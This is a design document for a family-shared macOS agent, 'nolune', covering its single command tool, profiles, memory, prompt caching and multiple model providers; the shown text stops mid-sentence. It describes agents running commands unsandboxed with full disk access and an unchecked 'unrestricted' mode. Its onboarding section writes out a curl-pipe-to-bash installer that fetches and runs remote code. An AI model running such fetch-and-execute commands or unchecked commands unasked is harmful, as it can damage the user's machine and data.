# nolune design

A small agent that runs on one Mac and does things on it for a family. One gateway process serves
a web UI. Family members share **profiles**. Each profile has its own conversations, workspace
folder, skills and memory. The agent has a single tool, `run_command`.

## Decisions

| Area               | Decision                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               |
| ------------------ | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| Execution          | Commands run as the gateway's macOS user with full access to the disk. There is no sandbox. The profile folder is only the default working folder. In auto mode (the default) a model checks each command before it runs and blocks what could do harm nobody asked for, in place of a person approving each one; unrestricted runs them unchecked. See [Auto mode](#auto-mode).                                                                                                                                                                                                                                                                                                                                                       |
| Clients            | Family members use the web UI only. The CLI is for the owner and for the agent itself (skill templates, self-configuration, which the built-in `nolune` skill explains).                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               |
| Exposure           | Public through nolune's relay (`<name>.nolune.family`, see [The relay](#the-relay)) or the family's own tunnel. Every route requires login, except the invite links an admin sends. The sign-up endpoint is disabled: admins make accounts on the People page or with the local CLI, or send a single-use invite link, and passwords must be long and strong.                                                                                                                                                                                                                                                                                                                                                                          |
| Profiles           | Any user can create a profile. Any member can add or remove members, rename the profile, or delete it. Deleting moves the folder to `~/.nolune/trash/` instead of erasing it.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                          |
| Conversations      | Shared by every member of the profile. Messages go through a queue, and a message sent while the agent is working is fed into its next step (steering). Anyone can press Stop.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         |
| Sender identity    | Every human message is sent to the model as `Name: text`. Attached files come first, each as a line saying who attached it and where it was saved, followed by the picture or PDF itself when the model gets one. Display names are unique across the gateway.                                                                                                                                                                                                                                                                                                                                                                                                                                                                         |
| Attachments        | Any file, up to 100 MB and 10 per message, saved in the profile's `attachments` folder. nolune keeps a copy of each picture and PDF the model gets and sends it by reference: through the provider's Files API (base64 only if an upload fails), whichever provider the chat moves to; the plans have none, so pictures and PDFs go inline. Every other file goes as its path.                                                                                                                                                                                                                                                                                                                                                         |
| Providers          | Anthropic, OpenAI, xAI and OpenRouter (API keys), custom providers (your own model servers), and two plans, someone's subscription instead of a key (see [Plans](#plans)): `claude-plan`, a Pro or Max plan in Claude Code, which nolune runs on this machine, and `chatgpt-plan`, a ChatGPT Plus or Pro plan, through Sign in with ChatGPT. Keys, custom providers and presets are global, managed by the admin with the CLI or the `/admin` page (Models & keys). A preset has a name (default `<model> (<provider>)`), a provider, a model and an optional window override. One preset is the default (the oldest until an admin picks one): new chats and automations without one use it. See [Model providers](#model-providers). |
| Preset switching   | Allowed at any time, from the model chip in a chat's composer (or `nolune agent run <id> --preset` for a subagent). The next model call uses the new model, and another provider gets the history translated. See [Switching models](#switching-models).                                                                                                                                                                                                                                                                                                                                                                                                                                                                               |
| Reasoning          | Chosen per conversation (`low` / `medium` / `high` / `xhigh` / `max`, default `medium`). It can be changed later, but on Claude that rebuilds the conversation's cache once, so the chat asks first.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                   |
| System prompt      | Built once when the conversation is created: instructions, the profile's soul, the skills catalog and, for a chat in a folder, the folder's instructions and file paths. **It is not changed afterwards, and no update notices are added,** with one exception: when the chat moves to another folder, or its folder or the soul changes, it is built again at the start of the next turn (one cache miss). If skills change in another conversation, this conversation only sees it by running commands. Of memory, only `core` and the note names are in it: chats outside folders share a prompt.                                                                                                                                   |
| Memory             | Short Markdown notes per profile, in fixed categories (a note each, or one per person or project), that the agent searches, reads and changes with `nolune memory`, like any other command. The system prompt has the pinned `core` note in full and lists the others by name; the facts that share words with a message go along with it, and once a chat goes quiet its model looks it over and saves what the agent missed. The family sees and edits them on the Memory page. See [Memory](#memory). Each member also has a card, a note about them that goes with them into all their profiles, copied whole into the prompt like core; only what they say about themselves goes on it. See [Cards](#cards).                      |
| Soul               | Who nolune is for a profile (character, values, tone), in `soul.md` in its folder, at most 4,000 characters. It opens every chat's system prompt. The family edits it in the profile's settings; the agent changes it itself with `nolune soul write` and says so. See [Soul](#soul).                                                                                                                                                                                                                                                                                                                                                                                                                                                  |
| Folders            | Group a profile's chats, like ChatGPT's projects. A folder has instructions and files; its chats get the instructions and the files' paths (never the files themselves) in their system prompt. Chats are dragged into folders in the sidebar or started in one. See [Folders](#folders).                                                                                                                                                                                                                                                                                                                                                                                                                                              |
| Skills             | Follow [agentskills.io](https://agentskills.io/client-implementation/adding-skills-support). They are read from `~/.nolune/profiles/<slug>/skills`, `~/.agents/skills` and the built-in skills (`packages/core/skills`: `automations`, `view-images`, `generate-images`, `subagents`, `nolune`); a profile skill overrides a global one, and both override a built-in one with the same name. The agent loads a skill by running `cat` on its `SKILL.md`, and creates new ones with `nolune skill new`.                                                                                                                                                                                                                                |
| Pictures and files | The agent writes Markdown: `![alt](path or URL)` shows a picture, `[label](path)` hands over a file. The gateway copies each one, byte for byte, when the reply is saved, and the chat only ever loads those copies. Web pictures only from links the agent found, never from the local network. The agent looks at pictures itself with `nolune view`, which attaches them to that command's result. There is no tool for either.                                                                                                                                                                                                                                                                                                     |
| Web search         | Handled by a skill that uses the firecrawl CLI. The gateway has no code for it.                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        |
| Background work    | `run_command` takes `run_in_background` (new chats): the call returns at once, and the command's output joins the conversation as a message when it ends. See [Background commands](#background-commands).                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             |
| Subagents          | `nolune agent run` starts another agent in a hidden conversation of its own that starts with only its task, and caches its prompt for 5 minutes. The agent hears back by running `nolune agent watch` in the background, and can steer it and read its log. No new tool. See [Subagents](#subagents).                                                                                                                                                                                                                                                                                                                                                                                                                                  |
| Making pictures    | The agent runs `nolune generate image` (OpenAI's Image API, `gpt-image-2.5-flare` by default; each other provider would be one more module). Templates belong to the Images page, which turns one and its settings into a finished prompt in the message it sends; the CLI knows nothing about them.                                                                                                                                                                                                                                                                                                                                                                                                                                   |

## Files on disk

```
~/.nolune/                 (override with NOLUNE_HOME)
  config.json                 auth secret, API keys (Anthropic, OpenAI, OpenRouter, xAI), custom providers
                              (name, API, address, key), image model,
                              extra env vars for commands, where Claude Code is if set, the
                              command mode and the preset that checks commands (mode 600)
  chatgpt.json                the ChatGPT sign-in for the ChatGPT plan: this computer's host id,
                              each account's registration and the signed-in one's tokens (mode 600)
  nolune.db                      SQLite: users, sessions, profiles, presets, folders, conversations,
                              messages, media, uploads, provider files, triggers, trigger runs,
                              notifications, subagents, running background commands, cards' names
  media/<sha256>              copies of the pictures and files shown in chats, of attached
                              files not sent yet, and people's profile pictures
  image-templates/<id>/       Images page templates for every profile (TEMPLATE.md, cover.webp)
  cards/<name>.md             each user's card, in every profile they're a member of (Cards)
  cards/.facts.json, .embeddings.json   as in a profile's memories/
  bin/nolune                     shim so the agent can run `nolune` from any command
  profiles/<slug>/            default working folder for commands in this profile
    soul.md                   who nolune is for this profile; opens every chat's prompt
    memories/<category>.md    long-term memory: a note per category (home.md, plans.md, …)
    memories/people/<name>.md   a note per person, in the family or not; projects/ likewise
    memories/core.md          the pinned note, copied into every new chat's prompt
    memories/.facts.json      when each fact in memory was first seen
    memories/.embeddings.json   each fact's embedding, for search by meaning, and their model
    memories/.suggestions.json  each member's new-chat chips, and the memory they were made from
    skills/<name>/SKILL.md
    attachments/              files people attached to messages
    image-templates/<id>/     this profile's own templates
    images/                   what `nolune generate image` made
    folders/<folder>/         files added to a chat folder
    agents/<chat>/<id>.log    what each subagent said and ran (no reasoning), for the agent that
                              started it; <chat> is the first 8 characters of that chat's id
  trash/<slug>-<timestamp>/   deleted profiles (and deleted folders' files)
~/.agents/skills/<name>/SKILL.md   global skills, visible to every profile
```

The folder name is a slug that is fixed when the profile is created. Renaming a profile changes
only its display name, so the skill paths already in system prompts stay valid.

The profile also stores its assistant's avatar (`profile.avatar`, one of eight names). A new profile
gets the one its slug picks; see [Assistant avatars](#assistant-avatars).

Every skill is on in every profile until someone turns it off, on the profile's Skills page or with
`nolune skill disable`. The profile stores the names it turned off (`profile.disabled_skills`), so skills
added later start out on. Skills that are off are left out of the catalog when a conversation is
created; conversations already running keep the catalog they started with.

## Prompt caching

The rule: **the request prefix must stay byte-identical, so history is only ever appended to.**

- Order of the request: `tools` → `system` → `messages`, the first two the conversation's own
  saved copies. Tools are saved with each chat (`conversation.tools`) like its system prompt, because
  a thinking block is bound to the tools it was made with: changing them for an existing chat would
  cost it a cache miss and, on Opus 5.5 and Fable 5.1, invalidate the thinking in its history (a
  400 on accounts created since 2026-08-31). So a new version of nolune that changes a tool only
  reaches new chats. Chats from before tools were saved send the first `run_command`
  (`RUN_COMMAND_TOOL_V1`, which must never change); new ones get the one with `run_in_background`.
- Each assistant response is stored as the exact `content` JSON the API returned, thinking blocks and
  their signatures included, and is sent back unchanged to the model that wrote it. nolune's own rows
  are stored in its own format and turned into the provider's the same way on every call (see
  [nolune's format](#nolunes-format)). Command output is truncated once, when the tool result is
  created, and never later.
- Cache markers: `cache_control: {type: "ephemeral", ttl: "1h"}` on the system block, plus the same
  setting at the top level of the request (automatic caching of the growing tail). Both use the
  same TTL, because the API requires longer-TTL entries to come before shorter ones. The TTL is
  per conversation (`conversation.cache_ttl`): an hour for chats, where people answer minutes
  apart, and 5 minutes for subagents, whose steps follow each other within seconds, so the
  cheaper 5-minute write (1.25x the input price, against 2x for an hour) is enough.
- Tool definitions, cache TTL and system prompt are fixed per conversation (the prompt is built
  again only when the chat's folder changes; see [Folders](#folders)), and the model changes only
  when someone switches it (see [Switching models](#switching-models)). Thinking uses
  `adaptive` with `display: "summarized"`, the same for every conversation. The only per-conversation
  knob is `effort`.
- Facts recalled from memory go into the message they came with, not the system prompt (see
  [Memory](#memory)).
- Steering messages, stop results and restart-recovery results are **appended** as new rows. Nothing
  is ever edited or deleted. Opus 5.5 and Fable 5.1 require this anyway for "preserved thinking":
  replaying a thinking block after its prefix changed returns a 400 on newer accounts.
- Every assistant row stores `usage`, and the gateway logs `cache_read` / `cache_write` and the hit
  rate for every call. The chat header shows the hit rate (tooltip: last reply and whole conversation),
  and a reply is marked as a cache miss when it read less than the previous call read or wrote, with
  the likely cause: over an hour idle (the TTL) or a changed request such as a new model or
  reasoning level.

### On OpenAI

OpenAI's prompt cache is automatic, and the rule above is what keeps it working: `instructions`
(the system prompt), the tools, then the input items, with only the input growing. Requests carry
`prompt_cache_key` (the conversation's id), which keeps a conversation's calls on the same cache.
`cacheTtl` and the cache markers are Anthropic's alone. Usage reports `cached_tokens` (and, on
newer models, `cache_write_tokens`) inside `input_tokens`; nolune subtracts them, so the chat's
numbers mean the same for both providers.

### On OpenRouter

The same rule, over Chat Completions: the system message, the tools, then the messages, with only
the messages growing. Claude only caches what's marked, so for `anthropic/` models (and their
`~anthropic/` aliases) the system message carries `cache_control` with the conversation's TTL,
and so does the request's top level (automatic caching of the growing tail), as with Anthropic's
own API. Other models (OpenAI's, Gemini, DeepSeek, Grok...) cache on their own and get no
markers. Requests carry `session_id` (the conversation's id), which keeps a conversation on the
same provider behind OpenRouter, whose cache holds its earlier calls. Usage reports
`cached_tokens` and `cache_write_tokens` inside `prompt_tokens`; nolune subtracts them, as for OpenAI.

### On xAI

As on OpenAI: xAI caches the same prefix on its own, and `prompt_cache_key` (the conversation's
id, which xAI also reads as its `x-grok-conv-id`) keeps a conversation on the server that has its
cache. Its reasoning models need their encrypted reasoning back to hit it, so it's asked for on
every request.

## Model providers

A conversation runs on its preset's provider until someone switches it to another preset (see
[Switching models](#switching-models)). `models.ts` is what the rest of nolune calls: it picks the
provider's module (`anthropic.ts`, `openai-chat.ts`, `openrouter.ts`, `custom-providers.ts`) for
the model call, the
chat's title, PDF token counts, model checks and what the model can be sent, and gets back the
same shape from each (the reply's content, its stop reason in Anthropic's words, usage, tool calls
and texts). Each API provider brings a `FileStore` for pictures and PDFs (see
[Attachments](#attachments)). The Claude plan is different: Claude Code (`claude-plan.ts`) runs the
agent loop, so the runner hands it whole turns (`runPlanTurn`; see [Plans](#plans)). The ChatGPT
plan's chats are OpenAI's, with the plan's sign-in instead of a key (`chatgpt-plan.ts`).

- **What's stored.** What nolune writes itself is in nolune's own format, and replies exactly as their
  provider returned them; each provider's module turns both into its request (see
  [nolune's format](#nolunes-format)).
- **Both SDKs load on first use** (`@anthropic-ai/sdk` in `anthropic.ts`, `openai` in
  `openai-chat.ts` and `openrouter.ts`), not when core loads: the bundled CLI carries all of
  core, and most `nolune` commands the agent runs never call a model. Loading OpenAI's up front made
  each of them about 50 ms slower (lazily, the cost is Node parsing its code, around 10 ms).
  Anthropic's is lighter (about 2 ms saved) and loads the same way, so the modules match. Error
  classes are checked only once their SDK is loaded, since before that no error can be one of
  them.
- **OpenAI** (`openai-chat.ts`) uses the Responses API through OpenAI's SDK (`openai`), which
  also retries overloads, rate limits and dropped connections, like Anthropic's. Requests are
  stateless (`store: false`), so every call sends the whole transcript, as with Anthropic, and
  nothing depends on OpenAI keeping a conversation. Reasoning comes back encrypted
  (`include: ["reasoning.encrypted_content"]`) and goes back with the reply's other items,
  unchanged. nolune's own blocks become input items the same way on every call (`toResponsesInput`):
  text as `input_text`, pictures as `input_image`, PDFs as `input_file`, command results as
  `function_call_output` (pictures from `nolune view` included). `run_command` is sent as a function
  tool built from the saved Anthropic definition, not strict, since `cwd` and the timeout are
  optional.
- **Reasoning** on OpenAI is `reasoning.effort`, with the same five levels, and
  `summary: "auto"`, which the chat shows as thinking. An organization that must be verified
  before it gets summaries refuses them; nolune then asks without them for the rest of the
  process's life, so replies still reason but the chat has nothing to show. GPT-4 and chat-tuned
  models get no reasoning settings. A rebuilt system prompt doesn't drop OpenAI's reasoning (it
  isn't bound to the prompt, unlike Claude's thinking).
- **What OpenAI doesn't have.** Its models API doesn't give a context window. nolune knows the
  flagships' (`knownContextWindow`): every one since GPT-5.4 (`gpt-5.4`, `gpt-5.5-pro`,
  `gpt-6-astra`, their dated snapshots) has 1,050,000 tokens. Other models (mini, nano, codex,
  older ones) can have far less, and a window set too large would let a conversation grow past
  what the model takes, for good, since history is never edited; so they get one only when the
  admin sets it. Without one, the chat's context meter shows "?" and PDFs share 25% of 200k
  tokens. Titles are asked for at `low` effort.
- **OpenRouter** (`openrouter.ts`) serves models from many providers behind one key, through its
  Chat Completions API. OpenAI's SDK speaks it, pointed at `https://openrouter.ai/api/v1` (or
  `OPENROUTER_BASE_URL`), so it brings the same retries and server-sent events; its errors are
  that SDK's classes too, so `models.ts` asks `openrouter.ts` first, which remembers the errors
  its own calls threw. Its Responses API isn't used: it's OpenAI's shape, documented for
  OpenAI's models. Like the others, every call sends the whole transcript.
- **What an OpenRouter reply is stored as.** A reply is one assistant message, stored as its
  pieces: its `reasoning_details` as they came (`reasoning.text` with Claude's signature,
  `reasoning.summary`, `reasoning.encrypted`), then its text as a `text` block, then its
  `tool_calls` (`function`). They stream in pieces keyed by `index` and are put together as they
  arrive. They go back as one assistant message (`content`, `tool_calls`, `reasoning_details`),
  the details unchanged and in order, which Claude and Gemini need to go on after a tool call.
  They go back only to the model that wrote them; any other model (the chat switched) gets the
  reply's text and calls (`portableReply`). Through OpenRouter a reasoning detail may be Claude's
  thinking, bound to the system prompt, so details from before a rebuilt prompt are left out
  (`beforePromptChange`), like thinking. A reply that was only reasoning has nothing to send and
  is skipped.
- **nolune's format on OpenRouter** (`toChatMessages`). Text becomes `text` parts, command results
  `tool` messages. An uploaded picture or PDF becomes a `file` part with its `file_id` (Chat
  Completions takes pictures that way too); a picture that couldn't be uploaded goes as an
  `image_url` part with a data URL, and one another provider's Files API holds as a note. A tool
  message takes only text, so the pictures `nolune view` attached to a result follow, each after the
  line naming it, in the user message after the results. `run_command` is sent as a function
  tool, as for OpenAI. Before `resolveFiles` gives OpenRouter its copies, `readableMessages` turns
  the pictures and PDFs the model can't take into notes: a chat that switched to a text-only
  model may hold them, and a request carrying one would fail.
- **Reasoning** on OpenRouter is `reasoning.effort`, with the same five levels, which OpenRouter
  maps for each model (a thinking budget for older Claude models, say) and ignores for models
  that don't reason. The chat shows `reasoning.text` and summaries as thinking; encrypted
  reasoning has nothing to show. Requests set no `max_tokens`, so OpenRouter allows the model's
  own maximum: an account with too few credits for that gets a 402, which nolune shows with where
  to add credits.
- **Models on OpenRouter.** Adding a preset reads OpenRouter's model list (`GET /models`), which
  says what each model takes: nolune refuses one that can't call tools, since the agent works
  through `run_command`, and takes the smaller of the model's `context_length` and its top
  provider's as the window. A variant (`:nitro`, `:online`) is looked up as its model unless it's
  listed itself. The list is kept for an hour for what the model can be sent (see
  [Attachments](#attachments)). Titles are asked for at `low` effort with 2,048 tokens.
- **xAI** (`xai.ts`) runs Grok with an xAI key. xAI's API is OpenAI's Responses API, so chats
  are `openai-chat.ts`'s with a client at `https://api.x.ai/v1` (or `XAI_BASE_URL`; never
  OpenAI's organization or project), the `XAI` target: `store: false`, the whole transcript,
  encrypted reasoning back to the model that wrote it, and `prompt_cache_key`. What differs:
  - **Effort.** Each model says which efforts it takes (`capabilities.reasoning_effort` in xAI's
    model lists; `ResponsesApi.effort`): the chat's goes as it is, or as the nearest below it the
    model takes (above, when there's none below), and a model that takes none (`grok-build-0.1`)
    gets no `reasoning` at all, though it still reasons and gets its reasoning back. A model the
    lists don't have gets the chat's, at most `high`, and a refusal is learned as for a custom
    provider. No reasoning summary is asked for: xAI's models give theirs anyway. xAI counts
    reasoning within `max_output_tokens`, so a short exchange with a model that takes no effort
    gets 16,000 tokens more, or a title or auto mode's verdict could be cut off before it's
    written.
  - **Models.** `GET /language-models` says what each model takes and writes, `GET /models` its
    window (`context_length`) and efforts; nolune joins them by id, keeps the models that write
    text, and leaves out the multi-agent ones, which take no tools of the caller's. Adding a
    preset checks the model is there (by id or alias) and takes its window. The lists are kept
    for an hour.
  - **Pictures and PDFs.** No Files API is used: pictures go inline to the models that see them
    (`input_modalities`), and only as JPEG or PNG, xAI's formats, so GIF and WebP are converted
    first (`pictureTypes`, for attachments and `nolune view`). A PDF goes as its path, since a
    file sent to xAI is only searched (its `attachment_search` tool), not read whole.
  - **Errors** are `{ code, error }` rather than OpenAI's `{ error: { message } }`, and a key xAI
    doesn't know is a 400 ("Incorrect API key provided"), which nolune reads as a rejected key. A
    403 is a team out of credits or over its spending limit. Its errors are OpenAI's SDK's
    classes, so `models.ts` asks `xai.ts` first, which remembers its own calls' errors, as
    OpenRouter's does. The key is checked with `GET /api-key`, which also says whether the key or
    its team is blocked (saved, with a warning).
- **Custom providers** (`custom-providers.ts`): the family's own servers (Ollama, LM Studio, oMLX,
  vLLM, llama.cpp's server, LiteLLM), each added by the admin as a provider of its own, among the
  API keys: a name (`Ollama`, `GPU box`), the API it speaks, an address and an optional key, kept
  in `config.json` (`customProviders`) and never sent to the page. Each shows by its name as a
  provider chip in Add a model. Chats on one run on OpenAI's code (`openai-chat.ts`, the Responses
  API: Ollama 0.13.3 and later, LM Studio 0.3.29 and later, vLLM, LiteLLM; not llama.cpp's server
  yet) or Anthropic's (`anthropic.ts`, the Messages API: Ollama 0.14 and later, LM Studio 0.4.1
  and later, llama.cpp's server, oMLX), as the `custom-openai` or `custom-anthropic` provider. A
  server that speaks both is added once for each; the API stays as it was added, since its
  presets' chats are in it, while its name, address and key can change. Each module takes a target
  (`ResponsesApi`, `MessagesApi`) whose client is the SDK pointed at the server: OpenAI's at its
  `/v1` (added when the address is only a host), Anthropic's at the address without it (the SDK
  adds `/v1/messages`). Everything an SDK would read from the environment is given (a key, or `none`,
  and no organization or project), so `OPENAI_API_KEY`, `ANTHROPIC_API_KEY`,
  `ANTHROPIC_AUTH_TOKEN` and Anthropic's saved credentials never reach a server; a server's key
  goes both ways servers take it (`x-api-key`, and a bearer token for Ollama's). A custom
  preset's model is `<id>/<model>` (`gpu-box/qwen3:32b`), the id made from the name when it was
  added and never changed after, so the name can: ids have no slash, so the first one ends it, and
  a chat copies it from its preset like any model id, so it stays on the custom provider it
  started on; the server gets the model's own id. Adding one asks its server for its models
  (`GET /v1/models`): one that turns the key down isn't saved, one that doesn't answer is, with a
  warning, since it may not run yet.
  - **What differs from OpenAI's and Anthropic's own.** Requests leave out what only they have:
    OpenAI's encrypted reasoning and prompt cache key, and levels above `high` (sent as `high`);
    Anthropic's cache marks, adaptive thinking and effort, and a server's `max_tokens` is 32,000
    rather than 64,000, its window usually being smaller. A model a custom provider refuses
    reasoning settings for (a 400 about reasoning or thinking) gets none from then on, learned
    like OpenAI's refused summaries. A server's reasoning shows in the chat (a Responses API
    server's `reasoning_text`, a Messages API server's `thinking`), and never goes back: it has
    nothing encrypted, and no signature to check thinking by. A short reply (a title, the
    note-taker's) drops the `<think>…</think>` a server without a reasoning parser leaves in the
    text.
  - **Pictures, models, errors.** Nothing says which of a server's models see pictures or read
    PDFs, and there's no Files API, so those go as their paths (`modelInputs` is false for both),
    and a chat that switched to one gets notes for those it holds. Adding a preset checks that
    the server lists the model, when it lists any, and takes its window when the list says one
    (`max_model_len`, as vLLM does; `context_length`); otherwise it's unknown until the admin sets
    it. Whether the model calls tools shows at its first reply. A server's errors are OpenAI's or
    Anthropic's SDK's classes, and their code's, so `custom-providers.ts` tags them with the custom
    provider and `models.ts` asks it first; they name it ("Couldn't reach GPU box at …").
- **Another provider** (Gemini) would be one more module next to these, with a
  function turning nolune's format into its request (Gemini's thought signatures would ride in
  `native` like OpenAI's encrypted reasoning), a branch in each of `models.ts`'s functions, a
  `FileStore` (or pictures inline), its key in `API_KEYS` (config.ts) with a check request in
  `api-keys.ts`, and its name in `PROVIDERS` and the schema's `provider` enums (a TypeScript list
  only: SQLite stores any text there).

### nolune's format

`format.ts` defines what a conversation holds, whichever provider runs it: blocks (`text`,
`image`, `pdf`, `reasoning`, `tool_call`, `tool_result`) in messages. A picture's or PDF's source
is `media` (kept by nolune, which `resolveFiles` turns into each provider's copy before a request),
`inline` (base64, which every provider takes) or `uploaded` to one provider's Files API (rows
from before nolune kept its own copies). Each
provider's module turns messages into its request, leaving out what it can't take:
`toAnthropicMessages` in `anthropic.ts` (Claude Code on a Claude plan gets the same blocks, from
`toAnthropicBlocks`), `toResponsesInput` in `openai-chat.ts` (the ChatGPT plan's too, its calls in
nolune's namespace) and `toChatMessages` in `openrouter.ts`. Nothing else in nolune knows a
provider's shapes: the runner, the chat's display, plain-text transcripts and image limits all
read nolune's format.

- **nolune's own rows** (people's messages, attachments, command results, automations' and
  subagents' messages, notices, its own replies such as a notification continued in a chat) are
  stored in it, with `message.format` 'nolune'.
- **Replies** are stored exactly as their provider returned them (`format` null), and read into
  nolune's blocks with the original kept (`native`): only the model that wrote a reply reads its
  reasoning back, and only unchanged. The encoders send `native` to that model, and the blocks'
  text and calls (`portableReply`) to any other (see [Switching models](#switching-models)).
  Anthropic's, OpenAI's and OpenRouter's type names differ, so `replyBlocks` reads any of them
  without knowing who wrote it.
- **Rows from before nolune's format** have nolune's blocks in Anthropic's shape. They're read into nolune's
  format the same way, and each block keeps what was stored (`storedAs`, in a `WeakMap`, never
  written anywhere), which `toAnthropicBlocks` sends as it is: Claude gets those rows byte for
  byte, as before, so old conversations keep their cache and thinking. A block nolune has no type
  for (from those rows, or a result Claude Code wrote itself) is an `other` block that carries its
  Anthropic original and goes only to Claude. Stored rows are never rewritten.

### Plans

`claude-plan` and `chatgpt-plan` run chats on someone's own subscription instead of an API key.
(A third, a subscription to nolune itself that covers pictures and embeddings too, is designed in
[The nolune plan](#the-nolune-plan) but not built.) They get there differently:

- **The Claude plan** runs Anthropic's own agent. Anthropic doesn't let other apps sign in to
  Claude accounts, so nolune doesn't: Claude Code, installed on this computer and unmodified, signs
  in, keeps the sign-in, bills the plan and runs the agent loop, asking nolune to run each command
  (below).
- **The ChatGPT plan** uses OpenAI's Sign in with ChatGPT for open-source, locally hosted apps:
  nolune registers with the person's ChatGPT account, keeps the sign-in on this computer and makes
  the Responses API requests itself, in its own loop, counted toward the plan (below).

What they share is in `plans.ts`:

- **One kind of error.** Both turn whatever fails with the plan into a `PlanError` in words for
  the people in the chat, with the plan's own `kind` (`authentication_failed`,
  `subscription_sharing_usage_limit_exceeded`...), so `describeApiError` and `shortApiError` know
  nothing about either.
- **One status.** `claudePlanStatus()` and `chatGptPlanStatus()` say who a plan is signed in as
  (`signedIn`: "signed in as anna@example.com (Claude Max)", or "(ChatGPT Plus)", from
  `describePlanAccount`) and what stops chats on it (`problem`); the Claude plan's also where
  Claude Code is (`path`, `installed`). Adding a preset checks the same, since nothing is billed.
- **The same commands and page.** `nolune <plan> status` and `nolune <plan> setup` for both
  (`packages/cli/src/plans.ts`), printing the same line, and `nolune config set claude-path` for a
  Claude Code nolune doesn't find. `chatgpt-plan` adds `logout` and `models`. Models & keys has one
  Plans list with a row for each.
- **No Files API.** Pictures and PDFs go inline for both, within the conversation's 20 MB, and a
  PDF's tokens are estimated from its pages.
- **Limits.** Plan limits assume one person's ordinary use, so the help, the page and the docs
  suggest keeping busy automations and subagents on an API key preset.

### The Claude plan

`claude-plan` presets run chats on the Pro or Max plan (Team and Enterprise work the same) that
someone signed in to Claude Code with on this computer, instead of an API key. Anthropic doesn't
let other apps sign in to Claude accounts or hold their tokens, so nolune doesn't: it runs the
installed Claude Code, unmodified, through the Claude Agent SDK
(`@anthropic-ai/claude-agent-sdk`, in `claude-plan.ts`), and Claude Code signs in and bills the plan
itself. Anthropic's help center counts this as Agent SDK use of the subscription, which draws from
the plan's usage limits (a separate monthly Agent SDK credit was announced for June 2026, then
paused). Those limits assume one person's ordinary use, which is why the docs suggest keeping busy
automations and subagents on an API key preset.

- **One kind of turn.** The runner hands Claude Code a whole turn (`PlanTurn`, through
  `runPlanTurn` in `models.ts`): the chat's session, what it hasn't seen yet in nolune's format (with
  `resolve`, which reads nolune's copies of its pictures into it), nolune's system prompt and tools,
  and callbacks that save each reply before its commands run, run a command and save the results,
  so the chat gets the same rows and live events as from nolune's own loop. The session is
  `conversation.provider_session` (its id, the last row it was sent, and the plan whose agent has
  it), saved once Claude Code took the turn's input (`onStarted`). Only rows it hasn't been sent go,
  as one message; a turn that failed after it took its input is continued with `[Continue.]`. A
  chat it has never seen that already has replies (a notification opened as a chat, or replies from
  another model the chat used before) gets them first as a plain-text transcript, in a new session,
  and so does one whose session Claude Code lost (`planSessionProblem`). Messages sent while it
  works join after its turn, not at its next step.
- **Stop** interrupts Claude Code's turn and kills the running command, as elsewhere (a
  `PlanStopped`); a turn that hasn't ended 5 seconds later is closed. A reply cut off mid-stream
  is dropped.
- **Who runs the loop.** Claude Code. Each turn is a `query()` that resumes the chat's Claude Code
  session, whose id nolune picks: at first the chat's own.
- **What the model gets.** nolune's system prompt and the chat's saved `run_command` definition, as an
  in-process MCP tool (`mcp__nolune__run_command` to the model). Claude Code's built-in tools, settings
  files, CLAUDE.md, skills and MCP servers are left out (`tools: []`, `settingSources: []`,
  `strictMcpConfig`, `dontAsk` permissions with only that tool allowed). Claude Code adds a short
  line of its own to the system prompt and an environment note (working folder, date). The
  working folder is the profile's, like commands'.
- **The same rows.** nolune turns the stream into its own rows and live events: each model call's
  reply is saved (the tool's name back to `run_command`) before its commands run, then one
  `tool_results` row with every result, as in nolune's loop. Claude Code starts a tool as soon as its
  block is complete, so nolune's handler waits until the reply is saved (at `message_stop`, or when a
  reply came whole). Commands run one at a time through `runToolCall`, with live output, `nolune view`
  pictures (inline) and background commands as usual.
- **Context window.** It isn't known before a call, except for Claude Code's 1M-context models,
  whose ids say so (`claude-opus-5-5[1m]`), so the context meter shows "?" (and PDFs get 25% of
  200k tokens) unless the preset sets one. Titles are asked for through Claude Code too, as one
  exchange without a session.
- **Environment.** Claude Code gets nolune's environment without `ANTHROPIC_API_KEY` and
  `ANTHROPIC_AUTH_TOKEN`, which it would use (and bill) instead of the plan. A
  `CLAUDE_CODE_OAUTH_TOKEN` there (from `claude setup-token`) reaches Claude Code but, like API
  keys, not the agent's commands. nolune looks for `claude` on the PATH and in its installers'
  folders (`~/.local/bin`, `~/.claude/local`, Homebrew), or at `nolune config set claude-path`. The
  SDK's own copy of Claude Code (about 230 MB per platform) isn't shipped, so the Claude Code
  people keep up to date is the one that runs.
- **Errors.** Claude Code reports API errors as a reply of its own (`error: authentication_failed`,
  `rate_limit`...), which nolune shows as the chat's error, with how to sign in when that's the
  problem. `nolune claude-plan status`, the admin page's Check sign-in and adding a preset start
  Claude Code without sending anything and ask who it's signed in as (`accountInfo()`): a plan
  (`Claude Max`...) or a `claude setup-token` token passes; an API key, another provider or no
  sign-in ("Claude API") doesn't. Whether it takes the model only shows at the chat's first reply.
- **Onboarding.** Without Claude Code, every one of those says so and how to install it; nolune never
  falls back to the SDK's own copy. At a terminal, `nolune claude-plan setup` offers what's
  missing, asking before each: Anthropic's installer
  (`curl -fsSL https://claude.ai/install.sh | bash`, which puts it in `~/.local/bin`, where nolune
  looks even when the PATH doesn't), then Claude Code's own sign-in (`claude auth login
--claudeai`), which opens Anthropic's page in a browser and keeps what it gets. The admin page
  shows the same steps but can't sign in itself: relaying Claude's sign-in through nolune's web page
  would be nolune handling it.
- **Pictures and PDFs** go inline as base64, since there's no Files API: nolune's copies are read
  into the request (`resolveFiles`). Claude Code passes them to the model as they are, and
  `nolune view` pictures come back in `run_command`'s MCP result as images. They count against the
  conversation's inline limit (20 MB, which keeps requests under the API's 32 MB); a chat that
  moved to the plan with more than that sends the rest as notes, oldest first inline. A PDF's tokens can't be counted without the API, so they're estimated at 4,000 a page
  (Anthropic's 1,500 to 3,000 for a page's text, plus the page as a picture) from the page count in
